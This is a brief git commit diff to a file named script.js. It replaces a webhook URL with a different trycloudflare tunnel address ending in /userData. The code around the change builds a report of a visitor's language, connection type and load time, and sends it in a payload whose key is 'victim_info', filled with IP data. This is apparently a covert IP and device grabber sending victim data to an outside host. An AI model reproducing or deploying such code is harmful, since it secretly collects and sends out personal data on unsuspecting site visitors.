58c0ff52087be2289f9fec9b950712298e2f7a52
Elysioxx <108831238+elyelysiox@users.noreply.github.com>
2025-03-24 23:40:24 -0500

    update file

--- script.js
+++ script.js
@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://failed-thumbzilla-starting-jumping.trycloudflare.com/userData";
+                const webhookURL = "https://vcr-fixes-graphs-necessary.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
